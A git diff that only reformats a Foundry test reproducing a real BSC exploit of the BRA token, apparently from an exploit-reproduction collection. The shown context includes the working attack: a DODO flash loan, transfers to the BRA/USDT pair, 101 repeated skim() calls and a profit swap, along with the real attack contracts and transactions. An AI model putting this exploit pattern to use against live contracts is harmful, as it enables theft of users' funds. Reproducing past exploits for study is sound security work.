@@ -12,7 +12,7 @@ import "./interface.sol";
 // Attack Contract :
 //  0x1fae46b350c4a5f5c397dbf25ad042d3b9a5cb07
 //  0x6066435edce9c2772f3f1184b33fc5f7826d03e7
-// Attack Txs : 
+// Attack Txs :
 //  0x6759db55a4edec4f6bedb5691fc42cf024be3a1a534ddcc7edd471ef205d4047 (profit 675 WBNB)
 //  0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348 (profit 144 WBNB)
 // Vulnerable Contract Code :
@@ -30,8 +30,9 @@ import "./interface.sol";
 contract Attacker is Test {
     WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     Exploit immutable exploit;
+
     constructor() {
-        vm.createSelectFork("bsc", 24655771);
+        vm.createSelectFork("bsc", 24_655_771);
         exploit = new Exploit();
     }
 
@@ -39,7 +40,6 @@ contract Attacker is Test {
         emit log_named_decimal_uint("[Before Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
         exploit.go();
         emit log_named_decimal_uint("[After Attacks] Attacker WBNB balance", wbnb.balanceOf(address(this)), 18);
-
     }
 }
 
@@ -51,7 +51,6 @@ contract Exploit is Test {
     IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;
-
 
     function go() public {
         console.log("Step1. Flashloan 1400 WBNB from DODO");
@@ -88,13 +87,12 @@ contract Exploit is Test {
         bra.transfer(BRA_USDT_Pair, sendAmount);
 
         console.log("Start Exploit: skim() to earn");
-        for(uint i; i < 101; ++i) {
+        for (uint256 i; i < 101; ++i) {
             IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
         }
 
         uint256 pairBalanceAfter = bra.balanceOf(BRA_USDT_Pair);
         emit log_named_decimal_uint("[After Exp] Pair contract BRA balance", pairBalanceAfter, 18);
-
 
         console.log("Swap BRA (profit) to USDT");
         address[] memory inputSwapPath = new address[](2);
@@ -186,14 +184,14 @@ interface IDPPAdvanced {
         bool isOpenTWAP
     ) external;
     function initOwner(address newOwner) external;
-    function querySellBase(address trader, uint256 payBaseAmount)
-        external
-        view
-        returns (uint256 receiveQuoteAmount, uint256 mtFee, uint8 newRState, uint256 newBaseTarget);
-    function querySellQuote(address trader, uint256 payQuoteAmount)
-        external
-        view
-        returns (uint256 receiveBaseAmount, uint256 mtFee, uint8 newRState, uint256 newQuoteTarget);
+    function querySellBase(
+        address trader,
+        uint256 payBaseAmount
+    ) external view returns (uint256 receiveQuoteAmount, uint256 mtFee, uint8 newRState, uint256 newBaseTarget);
+    function querySellQuote(
+        address trader,
+        uint256 payQuoteAmount
+    ) external view returns (uint256 receiveBaseAmount, uint256 mtFee, uint8 newRState, uint256 newQuoteTarget);
     function ratioSync() external;
     function reset(
         address assetTo,
@@ -218,4 +216,4 @@ interface IDPPAdvanced {
     ) external returns (bool);
     function tunePrice(uint256 newI, uint256 minBaseReserve, uint256 minQuoteReserve) external returns (bool);
     function version() external pure returns (string memory);
-} 
+}
